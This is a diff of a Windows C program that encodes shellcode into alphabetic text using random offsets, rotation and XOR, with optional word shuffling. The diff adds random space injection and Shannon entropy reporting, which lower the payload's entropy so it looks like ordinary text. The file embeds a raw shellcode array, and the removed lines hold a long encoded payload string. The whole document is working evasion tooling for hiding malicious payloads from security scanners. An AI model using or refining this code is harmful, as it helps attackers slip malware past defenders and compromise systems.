@@ -1,4 +1,5 @@
 #include <Windows.h>
+#include <math.h>   // for log2 function
 #include <stdio.h>
 
 // ============================================================================================================================================================
@@ -6,11 +7,23 @@
 //
 #define SHUFFLE_ORDER
 
+//
+#define INJECT_SPACES
+
 // ============================================================================================================================================================
 
 #define ROTL8(x,n)  ((BYTE) ( ((UINT8)(x) << (n)) | ((UINT8)(x) >> (8 - (n))) ) & 0xFF)
 #define ROTR8(x,n)  ((BYTE) ( ((UINT8)(x) >> (n)) | ((UINT8)(x) << (8 - (n))) ) & 0xFF)
+
 #define XOR_VALUE    0xA5
+
+#ifdef INJECT_SPACES
+
+#define MIN_SPACE_INJECT  3
+#define MAX_SPACE_INJECT  5
+
+#endif // INJECT_SPACES
+
 
 // ============================================================================================================================================================
 
@@ -37,7 +50,7 @@ static BOOL RtlGenRandom(OUT PBYTE pRndValue)
 
 static __inline BOOL IsAlphabatical(BYTE c)
 {
-    return ((c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z'));
+	return (c >= 'A' && c <= 'Z');
 }
 
 static BOOL GetAlphabeticalOffset(IN BYTE bPlainByte, OUT PBYTE pbOffset, OUT PBYTE pbTransformed)
@@ -51,13 +64,13 @@ static BOOL GetAlphabeticalOffset(IN BYTE bPlainByte, OUT PBYTE pbOffset, OUT PB
     if (!RtlGenRandom(&bRndmStart))        
         return FALSE;
 
-    bRndmStart %= 52;
+    bRndmStart %= 26;
 
-    for (BYTE i = 0; i < 52; i++)
+    for (BYTE i = 0; i < 26; i++)
     {
-        bIndex          = (BYTE)(bRndmStart + i) % 52;
-        bBaseByte       = (BYTE)(bIndex < 26 ? 'A' : 'a'); 
-        bCandidateOff   = (BYTE)(bBaseByte + (bIndex % 26));
+        bIndex          = (BYTE)(bRndmStart + i) % 26;
+        bBaseByte       = (BYTE)'A';
+        bCandidateOff   = (BYTE)(bBaseByte + bIndex);
         bTmpTransf      = (BYTE)(ROTL8((bPlainByte + bCandidateOff), 4) ^ XOR_VALUE);
 
         if (IsAlphabatical(bTmpTransf))                                
@@ -69,7 +82,7 @@ static BOOL GetAlphabeticalOffset(IN BYTE bPlainByte, OUT PBYTE pbOffset, OUT PB
     }
 
     // Fallback
-    *pbOffset       = (BYTE)(BYTE)((bRndmStart < 26 ? 'A' : 'a') + (bRndmStart % 26));
+    *pbOffset       = (BYTE)('A' + (bRndmStart % 26));
     *pbTransformed  = (BYTE)(ROTL8((bPlainByte + *pbOffset), 4) ^ XOR_VALUE);
     return TRUE;
 }
@@ -80,17 +93,24 @@ static BOOL GetAlphabeticalOffset(IN BYTE bPlainByte, OUT PBYTE pbOffset, OUT PB
 
 BOOL AlphabaticalShellcodeEncode(IN PBYTE pRawHexShellcode, IN DWORD dwRawHexShellcodeSize, OUT PBYTE* ppEncodedShellcode, OUT PDWORD pdwEncodedShellcodeSize) {
 
-    PWORD   pwEncodedBuffer     = NULL;
-    PBYTE   pTempShellcode      = NULL;
+    PWORD   pwEncodedBuffer         = NULL;
+    PBYTE   pEncodedSpacedBuffer    = NULL;
+    PBYTE   pTempShellcode          = NULL;
 
-	if (!pRawHexShellcode || dwRawHexShellcodeSize == 0 || !ppEncodedShellcode || !pdwEncodedShellcodeSize) return FALSE;
-    if (dwRawHexShellcodeSize > (SIZE_MAX / sizeof(WORD))) return FALSE;
+    if (!pRawHexShellcode || !dwRawHexShellcodeSize || !ppEncodedShellcode || !pdwEncodedShellcodeSize)
+        return FALSE;
 
-    *pdwEncodedShellcodeSize    = dwRawHexShellcodeSize * sizeof(WORD);
-    *ppEncodedShellcode         = NULL; 
+    if (dwRawHexShellcodeSize > (SIZE_MAX / sizeof(WORD)))
+        return FALSE;
 
-	if (!(pwEncodedBuffer = (PWORD)LocalAlloc(LPTR, *pdwEncodedShellcodeSize))) return FALSE;
-    if (!(pTempShellcode = (PBYTE)LocalAlloc(LPTR, dwRawHexShellcodeSize))) goto _END_OF_FUNC;
+    *pdwEncodedShellcodeSize    = dwRawHexShellcodeSize * sizeof(WORD);   
+    *ppEncodedShellcode         = NULL;
+
+    if (!(pwEncodedBuffer = (PWORD)LocalAlloc(LPTR, *pdwEncodedShellcodeSize)))
+        return FALSE;
+
+    if (!(pTempShellcode = (PBYTE)LocalAlloc(LPTR, dwRawHexShellcodeSize)))
+        goto _END_OF_FUNC;
 
     RtlCopyMemory(pTempShellcode, pRawHexShellcode, dwRawHexShellcodeSize);
 
@@ -119,60 +139,165 @@ BOOL AlphabaticalShellcodeEncode(IN PBYTE pRawHexShellcode, IN DWORD dwRawHexShe
         pwEncodedBuffer[i]      = (WORD)((bOffset << 8) | bTransformed);                       
    }
 
-   *ppEncodedShellcode         = (PBYTE)pwEncodedBuffer; 
-	
-_END_OF_FUNC:
-    if (pTempShellcode) 
-        LocalFree(pTempShellcode);
-    if (!*ppEncodedShellcode && pwEncodedBuffer)
+#ifdef INJECT_SPACES
+    DWORD dwEncodedSpacedSize     = (*pdwEncodedShellcodeSize / MIN_SPACE_INJECT) + *pdwEncodedShellcodeSize;
+    DWORD dwRandomNumber          = 0;
+    DWORD dwRealEncodedSpacedSize = 0;
+    PBYTE pEncodedBuffer          = (PBYTE)pwEncodedBuffer;      
+
+    if (!(pEncodedSpacedBuffer = (PBYTE)LocalAlloc(LPTR, dwEncodedSpacedSize)))
+        goto _END_OF_FUNC;
+
+    if (!RtlGenRandom((PBYTE)&dwRandomNumber)) goto _END_OF_FUNC;
+
+    dwRandomNumber = MIN_SPACE_INJECT + (dwRandomNumber % (MAX_SPACE_INJECT - MIN_SPACE_INJECT + 1));
+
+    for (DWORD i = 0, j = 0; i < *pdwEncodedShellcodeSize; ++i, --dwRandomNumber)
     {
-		LocalFree(pwEncodedBuffer);
-		return FALSE;
+        pEncodedSpacedBuffer[j++] = pEncodedBuffer[i];
+        ++dwRealEncodedSpacedSize;
+
+        if (dwRandomNumber == 0)
+        {
+            DWORD dwRndEvenOdd = 0;
+
+            if (!RtlGenRandom((PBYTE)&dwRndEvenOdd)) goto _END_OF_FUNC;
+
+			// 50% chance to inject a space
+            // if ((dwRndEvenOdd & 1) == 0)                        
+
+			// 75% chance to inject a space
+            if ((dwRndEvenOdd % 4) != 3)
+            {
+                if (j >= dwEncodedSpacedSize) goto _END_OF_FUNC;
+
+                pEncodedSpacedBuffer[j++] = ' ';
+                ++dwRealEncodedSpacedSize;
+            }
+
+            if (!RtlGenRandom((PBYTE)&dwRandomNumber)) goto _END_OF_FUNC;
+            dwRandomNumber = MIN_SPACE_INJECT + (dwRandomNumber % (MAX_SPACE_INJECT - MIN_SPACE_INJECT + 1));
+        }
     }
-    return TRUE;
+
+    LocalFree(pwEncodedBuffer);
+    pwEncodedBuffer = NULL;
+
+    *ppEncodedShellcode      = pEncodedSpacedBuffer;
+    *pdwEncodedShellcodeSize = dwRealEncodedSpacedSize;
+#else
+    *ppEncodedShellcode      = (PBYTE)pwEncodedBuffer;
+#endif
+
+
+_END_OF_FUNC:
+   if (pTempShellcode)
+       LocalFree(pTempShellcode);
+#ifdef INJECT_SPACES
+   if (!*ppEncodedShellcode && pEncodedSpacedBuffer)
+       LocalFree(pEncodedSpacedBuffer);
+#else
+   if (!*ppEncodedShellcode && pwEncodedBuffer)
+       LocalFree(pwEncodedBuffer);
+#endif
+   return (*ppEncodedShellcode != NULL);
 }
 
 // ============================================================================================================================================================
 
 
+
+
+#ifdef INJECT_SPACES
+
+static PBYTE StripSpaces(IN PBYTE pEncodedShellcode, IN DWORD dwEncodedShellcodeSize, OUT PDWORD pdwStrippedSize) 
+{
+	if (!pEncodedShellcode || dwEncodedShellcodeSize == 0 || !pdwStrippedSize) return NULL;
+	
+    DWORD   dwStrippedSize  = 0x00;
+	PBYTE   pStrippedBuffer = (PBYTE)LocalAlloc(LPTR, dwEncodedShellcodeSize);
+
+	if (!pStrippedBuffer) return NULL;
+
+	for (DWORD i = 0; i < dwEncodedShellcodeSize; i++) {
+		if (pEncodedShellcode[i] != ' ') 
+        {
+			pStrippedBuffer[dwStrippedSize++] = pEncodedShellcode[i];
+		}
+	}
+	
+    *pdwStrippedSize = dwStrippedSize;
+	return pStrippedBuffer;
+}
+
+#endif 
+
+
+
 BOOL AlphabaticalShellcodeDecode(IN PWORD pEncodedShellcode, IN DWORD dwEncodedShellcodeSize, OUT PBYTE* ppDecodedShellcode, OUT PDWORD pdwDecodedShellcodeSize) {
 
-    if (!pEncodedShellcode || dwEncodedShellcodeSize == 0 || !ppDecodedShellcode || !pdwDecodedShellcodeSize) return FALSE;
-    if (dwEncodedShellcodeSize > (SIZE_MAX / sizeof(WORD))) return FALSE;
+    PBYTE  pCleanBuffer     = NULL;
+    PWORD  pwCleanEncoded   = NULL;
+    DWORD  dwCleanSize      = 0x00;
+    BOOL   bNeedFree        = FALSE;
 
-    *pdwDecodedShellcodeSize        = dwEncodedShellcodeSize / sizeof(WORD);                  
+    if (!pEncodedShellcode || !dwEncodedShellcodeSize || !ppDecodedShellcode || !pdwDecodedShellcodeSize)
+        return FALSE;
 
-    if (!(*ppDecodedShellcode = (PBYTE)LocalAlloc(LPTR, *pdwDecodedShellcodeSize))) return FALSE;
+#ifdef INJECT_SPACES
+    
+    pCleanBuffer = StripSpaces(pEncodedShellcode, dwEncodedShellcodeSize, &dwCleanSize);
+    
+    if (!pCleanBuffer || (dwCleanSize & 1)) 
+        goto _END_OF_FUNC;
 
-    for (DWORD i = 0; i < dwEncodedShellcodeSize / sizeof(WORD); i++) 
+    bNeedFree = TRUE;
+#else
+    pCleanBuffer    = pEncodedShellcode;
+    dwCleanSize     = dwEncodedShellcodeSize;
+#endif
+
+    *pdwDecodedShellcodeSize = dwCleanSize / sizeof(WORD);
+
+    if (!(*ppDecodedShellcode = (PBYTE)LocalAlloc(LPTR, *pdwDecodedShellcodeSize)))
+        goto _END_OF_FUNC;
+
+    pwCleanEncoded = (PWORD)pCleanBuffer;
+
+    for (DWORD i = 0; i < *pdwDecodedShellcodeSize; i++)
     {
         BYTE    bOffset             = 0x00,
                 bTransformed        = 0x00,
-                bEncoded            = 0x00;
+                bDecoded            = 0x00;
 
-        bTransformed                = (BYTE)(pEncodedShellcode[i] & 0xFF);            
-        bOffset                     = (BYTE)(pEncodedShellcode[i] >> 8);               
-        bEncoded                    = ROTR8((bTransformed ^ XOR_VALUE), 4);            
+        bTransformed                = (BYTE)(pwCleanEncoded[i] & 0xFF);
+        bOffset                     = (BYTE)(pwCleanEncoded[i] >> 8);
+        bDecoded                    = ROTR8((bTransformed ^ XOR_VALUE), 4);
 
-        (*ppDecodedShellcode)[i]    = bEncoded - bOffset;                              
+        (*ppDecodedShellcode)[i]    = bDecoded - bOffset;
     }
 
 
 #ifdef SHUFFLE_ORDER
 
-    DWORD   dwRoundedDownSize   = *pdwDecodedShellcodeSize & ~0x3;
+    DWORD   dwRoundedDownSize   = (dwCleanSize / sizeof(WORD)) & ~0x3;
     DWORD   dwTotalDwords       = dwRoundedDownSize / sizeof(DWORD);
     PDWORD  pdwRawHexShellcode  = (PDWORD)(*ppDecodedShellcode);
 
-	for (DWORD i = 0; i < dwTotalDwords; i++)
-	{
+    for (DWORD i = 0; i < dwTotalDwords; i++)
+    {
         pdwRawHexShellcode[i] = (((pdwRawHexShellcode[i] << 16) | (pdwRawHexShellcode[i] >> 16)) & 0xFFFFFFFFu);
-	}
+    }
 
 #endif 
 
 
-    return TRUE;
+_END_OF_FUNC:
+#ifdef INJECT_SPACES
+    if (bNeedFree && pCleanBuffer)
+        LocalFree(pCleanBuffer);
+#endif
+    return (*ppDecodedShellcode != NULL);
 }
 
 
@@ -228,6 +353,36 @@ VOID PrintHexArray(IN CONST CHAR* cArrayName, IN PBYTE pBufferData, IN SIZE_T sB
     printf("\n};\n");
 }
 
+
+
+DOUBLE CalculateShannonEntropy(IN PBYTE pBuffer, IN DWORD dwBufferSize) {
+
+	if (!pBuffer || !dwBufferSize)
+		return 00.0;
+
+	DWORD	dwFrequency[256]	= { 0 };
+	DOUBLE	dProbability		= 00.0,
+			dEntropy			= 00.0;
+
+	for (int i = 0; i < dwBufferSize; i++)
+	{
+		dwFrequency[pBuffer[i]]++;
+	}
+
+	for (int i = 0; i < 256; i++)
+	{
+		if (dwFrequency[i] == 0) continue;
+
+		dProbability	= (DOUBLE)dwFrequency[i] / (DOUBLE)dwBufferSize;
+		dEntropy		-= dProbability * log2(dProbability);
+			
+	}
+
+	return dEntropy;
+}
+
+
+
 // ============================================================================================================================================================
 // ============================================================================================================================================================
 
@@ -253,34 +408,17 @@ unsigned char PlainTextShellcode[276] = {
     0x65, 0x78, 0x65, 0x00
 };
 
-// ============================================================================================================================================================
-// ============================================================================================================================================================
 
-
-//
-#define TEST_ENCODING
-
-
-#ifndef TEST_ENCODING
-#define TEST_DECODING
-#endif // !TEST_ENCODING
 
 
 // ============================================================================================================================================================
 // ============================================================================================================================================================
 
-
-
-#ifdef TEST_ENCODING
 
 
 int main() {
-
-    /*
-    PrintHexAscii(L"Plain Text Shellcode", PlainTextShellcode, sizeof(PlainTextShellcode));
-    printf("\n\n");
-    */
-
+    
+	DOUBLE  dEntropy                = CalculateShannonEntropy(PlainTextShellcode, sizeof(PlainTextShellcode));
     PBYTE   pEncodedShellcode       = NULL;
     DWORD   dwEncodedShellcodeLen   = 0x00;
     PCHAR   pPrintableShellcode     = NULL;
@@ -290,60 +428,35 @@ int main() {
         return -1;
     }
 
-    /*
-    PrintHexAscii(L"Encoded Shellcode", (PBYTE)pEncodedShellcode, dwEncodedShellcodeLen);
-    printf("\n\n");
-    */
-
-    /*
-    PrintHexArray("EncodedShellcode", pEncodedShellcode, dwEncodedShellcodeLen);
-    */
-
     if (!(pPrintableShellcode = (PCHAR)LocalAlloc(LPTR, dwEncodedShellcodeLen + 1)))
     {
-		LocalFree(pEncodedShellcode);
-		return -1;
+        LocalFree(pEncodedShellcode);
+        return -1;
     }
 
     RtlCopyMemory(pPrintableShellcode, pEncodedShellcode, dwEncodedShellcodeLen);
     pPrintableShellcode[dwEncodedShellcodeLen] = '\0';
 
+    PrintHexAscii(L"Encoded Shellcode", (PBYTE)pEncodedShellcode, dwEncodedShellcodeLen);
+    printf("\n\n");
+
     printf("[*] Encoded Shellcode Length: %lu bytes\n", dwEncodedShellcodeLen);
+
+
+    printf("[*] Shannon Entropy of Plain Text Shellcode: %.2f\n", dEntropy);
+    dEntropy = CalculateShannonEntropy(pEncodedShellcode, dwEncodedShellcodeLen);
+    printf("[*] Shannon Entropy of The Encoded Shellcode: %.2f\n", dEntropy);
+
+    
+    //\
     printf("[*] Encoded Shellcode:\n\n%.*s\n", dwEncodedShellcodeLen, (CHAR*)pPrintableShellcode);
 
-	LocalFree(pPrintableShellcode);
-	LocalFree(pEncodedShellcode);
-	return 0;
-}
-
-#endif // TEST_ENCODING
-
-
-// ============================================================================================================================================================
-// ============================================================================================================================================================
-
-
-
-#ifdef TEST_DECODING
-
-
-unsigned char EncodedShellcode[] = "hYpypanteLclpmpumKnkaLclnjlKokNnbKfjNhnthQlJhwnthQizilmDhQoZmtmDhQnJmlntpNdenllTMAlklRmBlkuMgcmDikkpjPMRmlmKClbPpPOmgkeCgJAaaKgknkntlJmKMnxRiAnjmDaKlZopYOjtfljqSomDQOclkxoEkggldLlLntckCVohICntcLmCkamLpzivckdLfsokmDaMjtmDhQmXnobKckfflkeLfsodeKvtKBokckgkbomKkwvLbDAnMBlxnpAKbCfkpUogLFohkwgTmhMEiAolnVmKckdLodmHHSpQpAlSjqmLmKiACmdLntckchjtoTokdLoklCNditoNokOUokNfodkioknbmKizfPcLNfmKcmalLVXToSoRneQPbjfSOQlTcmCoaLcleRckaLaLclaLjohOaLntaLclckaKbKjqokdbaMGYnMjuDikJdafLeRTyoVokJacmXJgoiIeHtHMFpWxaltLbcqalaBiLWtoekwPZhmhrpJkzmKiCaLisgWiifbaMnYSAikOBnWclignD";
-
-
-
-int main() {
-
-
-    /*
-    PrintHexAscii(L"Plain Text Shellcode", PlainTextShellcode, sizeof(PlainTextShellcode));
-    printf("\n\n");
-    */
 
     PBYTE   pDecodedShellcode       = NULL;
     DWORD   dwDecodedShellcodeLen   = 0x00;
 
 
-    if (!AlphabaticalShellcodeDecode(EncodedShellcode, sizeof(EncodedShellcode) - 1, &pDecodedShellcode, &dwDecodedShellcodeLen))
+    if (!AlphabaticalShellcodeDecode(pEncodedShellcode, dwEncodedShellcodeLen, &pDecodedShellcode, &dwDecodedShellcodeLen))
     {
         return -1;
     }
@@ -351,12 +464,8 @@ int main() {
     PrintHexAscii(L"Decoded Shellcode", pDecodedShellcode, dwDecodedShellcodeLen);
     printf("\n\n");
 
-    /*
-    PrintHexArray("DecodedShellcode", pDecodedShellcode, dwDecodedShellcodeLen);
-    */
-
     if (dwDecodedShellcodeLen != sizeof(PlainTextShellcode) ||
-        memcmp(pDecodedShellcode, pDecodedShellcode, dwDecodedShellcodeLen) != 0)
+        memcmp(PlainTextShellcode, pDecodedShellcode, dwDecodedShellcodeLen) != 0)
     {
         printf("[!] Mismatch Detected: Decoded Output Does Not Match Original Input.\n");
     }
@@ -365,10 +474,13 @@ int main() {
         printf("[+] Success: Decoded Shellcode Matches Original.\n");
     }
 
+
+
+
+    LocalFree(pPrintableShellcode);
+    LocalFree(pEncodedShellcode);
     LocalFree(pDecodedShellcode);
+
     return 0;
+
 }
-
-
-#endif //  TEST_DECODING
-
